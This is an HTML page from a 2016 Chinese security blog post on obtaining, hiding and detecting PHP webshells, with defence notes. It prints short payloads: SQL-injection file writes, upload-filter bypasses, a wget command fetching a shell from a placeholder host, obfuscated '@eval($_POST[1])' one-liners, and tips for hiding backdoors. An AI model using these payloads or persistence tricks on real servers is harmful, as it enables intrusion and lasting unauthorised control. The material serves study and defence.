@@ -1,0 +1,777 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="web shell," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="webshell获取与查杀
+
+
+0x00前言
+顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限，以asp、php、jsp或cgi等网页形式存在得到一种命令执行环境。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。
+那么我们为什么">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell获取与查杀">
+<meta property="og:url" content="https://shawnleon.github.io/2016/08/04/get-webshell-searchkilling/index.html">
+<meta property="og:site_name" content="冲破桎梏">
+<meta property="og:description" content="webshell获取与查杀
+
+
+0x00前言
+顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限，以asp、php、jsp或cgi等网页形式存在得到一种命令执行环境。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。
+那么我们为什么">
+<meta property="og:image" content="https://shawnleon.github.io/images/q11.jpg">
+<meta property="og:updated_time" content="2016-08-05T00:58:30.975Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="webshell获取与查杀">
+<meta name="twitter:description" content="webshell获取与查杀
+
+
+0x00前言
+顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限，以asp、php、jsp或cgi等网页形式存在得到一种命令执行环境。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。
+那么我们为什么">
+<meta name="twitter:image" content="https://shawnleon.github.io/images/q11.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="https://shawnleon.github.io/2016/08/04/get-webshell-searchkilling/"/>
+
+  <title> webshell获取与查杀 | 冲破桎梏 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">冲破桎梏</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">金水桥畔龙吐珠,少林佛国大旱年</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                webshell获取与查杀
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-04T16:30:26+08:00" content="2016-08-04">
+              2016-08-04
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="webshell获取与查杀"><a href="#webshell获取与查杀" class="headerlink" title="webshell获取与查杀"></a>webshell获取与查杀</h1><hr>
+<p><img src="/images/q11.jpg" alt="image"></p>
+<hr>
+<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><hr>
+<p>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限，以asp、php、jsp或cgi等网页形式存在得到一种命令执行环境。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
+<p>那么我们为什么要入侵一个网站，当然自诩白帽子的我，如果拿到一个站，会提交的。其他人拿到服务器，可能为了数据吧，单纯的增加自己字典内容什么的。</p>
+<a id="more"></a>
+<h2 id="0x01-获得方式"><a href="#0x01-获得方式" class="headerlink" title="0x01 获得方式"></a>0x01 获得方式</h2><blockquote>
+<ul>
+<li>SQL注入（mysql数据库有file权限）获取webshell</li>
+<li>上传漏洞获取webshell</li>
+<li>任意命令执行获取webshell</li>
+<li>任意代码执行获取webshell</li>
+<li>任意文件包含获取webshell</li>
+<li>后台功能获取webshell</li>
+<li>等</li>
+</ul>
+</blockquote>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><blockquote>
+<ul>
+<li>当前连接mysql数据库的用户，具有file权限</li>
+<li>知道网站的绝对路径 （可通过报错，load_file（）读取配置文件）</li>
+<li>mysql有网站目录写权限</li>
+<li>单引号没被转义</li>
+</ul>
+</blockquote>
+<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><blockquote>
+<p>select &lt;? php  phpinfo(); ?&gt; into load_file ‘/var/www/html/phpinfo.php’</p>
+</blockquote>
+<h4 id="防护："><a href="#防护：" class="headerlink" title="防护："></a>防护：</h4><blockquote>
+<ul>
+<li>数据库连接用户使用非root权限（限制file权限，配置只能读某目录下的文件）</li>
+<li>不要输出mysql_error （php代码中注释调试信息）</li>
+<li>关闭远数据库程连接，采用防火墙或者安全策略</li>
+</ul>
+</blockquote>
+<h3 id="上传漏洞获取webshell"><a href="#上传漏洞获取webshell" class="headerlink" title="上传漏洞获取webshell"></a>上传漏洞获取webshell</h3><h4 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h4><ol>
+<li>先判断上传点是编辑器功能，还是写的代码上传。<blockquote>
+<ul>
+<li>如果是编辑器上传功能，搜当前编辑器版本的漏洞</li>
+<li>如果是代码写的上传功能</li>
+<li>上传一个正常jpg图片，查看路径</li>
+<li>上传图片一句话的jpg文件，抓包改后缀为php（可检测前端，mime，文件内容等验证）</li>
+<li>后缀过滤，%00截断。<br><em>绕过办法。当上述的改包失败后，只能上传一句话的jpg的时候。
+</em>解析漏洞 （判断web服务器类型和版本，并查找相关漏洞）<br>*结合其他功能 ，可结合文件包含，因为有图片路径。</li>
+</ul>
+</blockquote>
+</li>
+</ol>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><blockquote>
+<ul>
+<li>编辑器漏洞按照官方补丁升级,多关注技术前沿的文章，学习防护</li>
+<li>客户端，服务端使用白名单和黑名单严格过滤检测可允许上传文件大小，大小写文件名，文件类型。客户端生成临时文件名，特定目录。检测截断字符。</li>
+<li>用户可以更改文件名，但是不能更改文件后缀类型。</li>
+<li>对HTTP包头的content-type</li>
+<li>运维人员使用多种工具扫描，经常查看日志</li>
+<li>上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</li>
+</ul>
+</blockquote>
+<h3 id="任意代码执行获取webshell"><a href="#任意代码执行获取webshell" class="headerlink" title="任意代码执行获取webshell"></a>任意代码执行获取webshell</h3><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><blockquote>
+<ul>
+<li>网站绝对路径</li>
+<li>利用代码执行读取apache配置文件，查找根目录</li>
+<li>执行pwd ，获取当前目录路径</li>
+<li>apache对网站目录写权限，一般图片上传目录，apache都有写权限</li>
+</ul>
+</blockquote>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><blockquote>
+<p>command=echo “&lt;?php phpinfo(); ?&gt;” &gt; /var/www/ html/phpinfo.php<br>command=wget -O /var/www/html/phpinfo.php <a href="http://xxxx/phpinfo.txt" target="_blank" rel="external">http://xxxx/phpinfo.txt</a>  ///wegt可替换为curl</p>
+</blockquote>
+<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p>任何用户可以控制的变量都要进行严格的检查和过滤。只要有用户可输入的地方就有可能存在漏洞。</p>
+<h3 id="任意命令执行获取webshell"><a href="#任意命令执行获取webshell" class="headerlink" title="任意命令执行获取webshell"></a>任意命令执行获取webshell</h3><h3 id="任意文件包含获取webshell"><a href="#任意文件包含获取webshell" class="headerlink" title="任意文件包含获取webshell"></a>任意文件包含获取webshell</h3><h3 id="后台功能获取webshell"><a href="#后台功能获取webshell" class="headerlink" title="后台功能获取webshell"></a>后台功能获取webshell</h3><hr>
+<h2 id="0x02-持久隐藏webshell"><a href="#0x02-持久隐藏webshell" class="headerlink" title="0x02 持久隐藏webshell"></a>0x02 持久隐藏webshell</h2><hr>
+<p>一旦拿到webshell，那么要想长期控制网站或者服务器，就得隐藏的很深，以至于不会被轻易删除。</p>
+<p>###　文件及目录</p>
+<blockquote>
+<ul>
+<li>文件名尽量普通具有迷惑性　（/admin.help）<br>*　文件放在网站后台目录</li>
+</ul>
+</blockquote>
+<h3 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h3><blockquote>
+<p>在脚本文件里写入 include(‘/upload/x.jpg’)    ///图马一句话</p>
+</blockquote>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>&lt; \<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x3f;&#112;&#104;&#x70;&#10;&#x40;&#x5c;&#x24;&#x5f;&#43;&#43;&#x3b;&#10;&#x5c;&#x24;&#95;&#95;&#x3d;&#x28;&#8220;&#x23;&#x22;&#94;&#34;&#124;&#34;&#41;&#46;&#x28;&#x22;&#x2e;&#34;&#94;&#34;&#x7e;&#x22;&#41;&#x2e;&#40;&#34;&#47;&#34;&#x5e;&#34;&#96;&#x22;&#41;&#x2e;&#x28;&#34;&#x7c;&#x22;&#x5e;&#x22;&#x2f;&#34;&#x29;&#46;&#x28;&#34;&#x7b;&#34;&#94;&#x22;&#47;&#x22;&#41;&#59;&#10;&#64;&#36;&#123;&#92;&#36;&#95;&#95;&#125;&#x5b;&#33;&#x5c;&#x24;&#95;&#93;&#x28;&#92;&#x24;&#123;&#92;&#36;&#x5f;&#x5f;&#x7d;&#91;&#x5c;&#x24;&#x5f;&#x5d;&#41;&#x3b;&#x3f;">&#x3f;&#112;&#104;&#x70;&#10;&#x40;&#x5c;&#x24;&#x5f;&#43;&#43;&#x3b;&#10;&#x5c;&#x24;&#95;&#95;&#x3d;&#x28;&#8220;&#x23;&#x22;&#94;&#34;&#124;&#34;&#41;&#46;&#x28;&#x22;&#x2e;&#34;&#94;&#34;&#x7e;&#x22;&#41;&#x2e;&#40;&#34;&#47;&#34;&#x5e;&#34;&#96;&#x22;&#41;&#x2e;&#x28;&#34;&#x7c;&#x22;&#x5e;&#x22;&#x2f;&#34;&#x29;&#46;&#x28;&#34;&#x7b;&#34;&#94;&#x22;&#47;&#x22;&#41;&#59;&#10;&#64;&#36;&#123;&#92;&#36;&#95;&#95;&#125;&#x5b;&#33;&#x5c;&#x24;&#95;&#93;&#x28;&#92;&#x24;&#123;&#92;&#36;&#x5f;&#x5f;&#x7d;&#91;&#x5c;&#x24;&#x5f;&#x5d;&#41;&#x3b;&#x3f;</a><br>\&lt;?<br>@$_POST<a href="\$_POST[1]">0</a><br>\&lt;?<br>@eval(\$_POST[1])</p>
+<h3 id="callback-函数"><a href="#callback-函数" class="headerlink" title="callback 函数"></a>callback 函数</h3><h3 id="修改php代码"><a href="#修改php代码" class="headerlink" title="修改php代码"></a>修改php代码</h3><blockquote>
+<p>修改主页的代码。加入一句话之类的。</p>
+</blockquote>
+<h3 id="thinkphp-框架留后门"><a href="#thinkphp-框架留后门" class="headerlink" title="thinkphp 框架留后门"></a>thinkphp 框架留后门</h3><hr>
+<h2 id="0x03-如何检测webshell"><a href="#0x03-如何检测webshell" class="headerlink" title="0x03 如何检测webshell"></a>0x03 如何检测webshell</h2><hr>
+<p>漏洞很多都有互相辅助的利用方式，安全检测防护应该全面。</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><blockquote>
+<ul>
+<li>动态检测</li>
+<li>静态检测</li>
+<li>日志检测</li>
+</ul>
+</blockquote>
+<h4 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h4><p>静态检测技术是指对被测软件的源程序或者二进制代码进行扫描，从语法、语义上理解程序的行为，直接分析被检测程序的特征，寻找可能导致错误的异常。具体的扫描过程可以使用采取形式化验证技术的程序扫描，或者手工测试的方法。</p>
+<p>二进制对比技术(Binary Contrast)和词法分析(Lexical Analysis)是针对软件代码进行审查的检测技术，这类技术具有简单高效的优势，但是只针对代码本身特征的检查并不能很好的检查出具有逻辑关联的复杂 漏洞，虽然可以对其中引入模式识别来加强检查时特征的匹配类型，也只能略微加强其检查特征；规则检查(Rule Check)是检测已知漏洞的一种代码扫描技 术，对于已知类型漏洞，该技术具有高效且准确率高的特点，但是并不能检测未知类型的漏洞；类型推导(Type Inference)是针对编程语言本身的检测技术，自动化程度高，但是这种检查只能针对控制流不相关的漏洞；模型检测(Model Detection)是一种较为成熟的形式化检测方法，主要检测与时序相关的漏洞，但是这种检测方法对内存相关漏洞类型支持度不高，且检测时资源消耗大； 定理证明(Theorem Proving)与符号执行(Symbolic Execution)检测方法偏重于理论证明，使用严格的数学推理进行，但是目前并没有与实际应用契合度高的算法出现。</p>
+<h4 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h4><p>动态检测技术是一种不同于静态检测技术的动态的检测技术，它通过调试器运行被检测的软件的某项功能，检查运行结果与预期结果的差距，来确定被测软件此功能是否存在安全缺陷。这是一种针对软件功能的检测技术，它主要由构造测试用例，调试软件程序，分析软件程序三个部分构成。</p>
+<p>　　缺陷注入(Defect injection)具有自动化程度高的显著优点，但是其测试具有盲目性，测试用例量大，时间效率低；内存映射(Memory mapping)通过对内存映象进行管理来发现与内存相关的漏洞，该检测技术需要修改操作系统内核策略，在Windows平台下实用意义不大；安全共享库 (Safety shared libraries)是针对与系统调用相关的漏洞，检测准确率高，但是类型单一，对其他类型漏洞扩展性不佳；堆栈控制(Stack Control)是针对缓冲区溢出型漏洞的检测技术，对大部分漏洞具有很好的效果，但是对早期的程序兼容性不佳，且有较高的系统开销；沙箱 (Sandbox)和程序释义(Interpretation Procedure)分别是过滤型和伴随型的安全策略检测技术，控制严格，检测准确率较好，但是制订安全策略复杂，缺少实用度高的算法。</p>
+<p>####　日志检测</p>
+<p>日志是一个很重要的检测手段，可以通过各种日志来分析被入侵的手段方法，来更好的知己知彼针对防护，但是日志存在被删的可能，所以安装一些软件来实时监控文件，并且把改动的地方输出到几个不起眼的文件中，就算日志被删，还能有备份文件查看入侵者做了什么攻击。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-shell/" rel="tag">#web shell</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/08/03/linux-let-me-in/" rel="next" title="linux">
+                <i class="fa fa-chevron-left"></i> linux
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/1.jpg"
+               alt="shawnleon" />
+          <p class="site-author-name" itemprop="name">shawnleon</p>
+          <p class="site-description motion-element" itemprop="description">天地不仁以万物为刍狗</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">4</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shawnleon" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/copercheung" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.weibo.com/3691383884/profile?rightmod=1&wvr=6&mod=personinfo" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/profile.php?id=100009656739973" target="_blank" title="facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links/友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://shitoudaren.github.io/" title="shit欧建磊's blog" target="_blank">shit欧建磊's blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://leelie.github.io" title="伟伟's blog" target="_blank">伟伟's blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lovexiaofeng.cn/" title="李小峰's blog" target="_blank">李小峰's blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://scorpoin.github.io" title="大棟哥の blog" target="_blank">大棟哥の blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://liulangdelmao.github.io/" title="卓卓's blog" target="_blank">卓卓's blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nouername.github.io" title="qsf's blog" target="_blank">qsf's blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://passwd.tk" title="moon's blog" target="_blank">moon's blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell获取与查杀"><span class="nav-number">1.</span> <span class="nav-text">webshell获取与查杀</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-获得方式"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 获得方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">1.2.1.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#条件"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用："><span class="nav-number">1.2.1.2.</span> <span class="nav-text">利用：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防护："><span class="nav-number">1.2.1.3.</span> <span class="nav-text">防护：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传漏洞获取webshell"><span class="nav-number">1.2.2.</span> <span class="nav-text">上传漏洞获取webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#流程："><span class="nav-number">1.2.2.1.</span> <span class="nav-text">流程：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意代码执行获取webshell"><span class="nav-number">1.2.3.</span> <span class="nav-text">任意代码执行获取webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#条件-1"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防御-1"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意命令执行获取webshell"><span class="nav-number">1.2.4.</span> <span class="nav-text">任意命令执行获取webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意文件包含获取webshell"><span class="nav-number">1.2.5.</span> <span class="nav-text">任意文件包含获取webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后台功能获取webshell"><span class="nav-number">1.2.6.</span> <span class="nav-text">后台功能获取webshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-持久隐藏webshell"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 持久隐藏webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用文件包含"><span class="nav-number">1.3.1.</span> <span class="nav-text">利用文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#编码"><span class="nav-number">1.3.2.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#callback-函数"><span class="nav-number">1.3.3.</span> <span class="nav-text">callback 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改php代码"><span class="nav-number">1.3.4.</span> <span class="nav-text">修改php代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#thinkphp-框架留后门"><span class="nav-number">1.3.5.</span> <span class="nav-text">thinkphp 框架留后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-如何检测webshell"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 如何检测webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">1.4.1.</span> <span class="nav-text">分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#静态检测"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">静态检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#动态检测"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">动态检测</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shawnleon</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
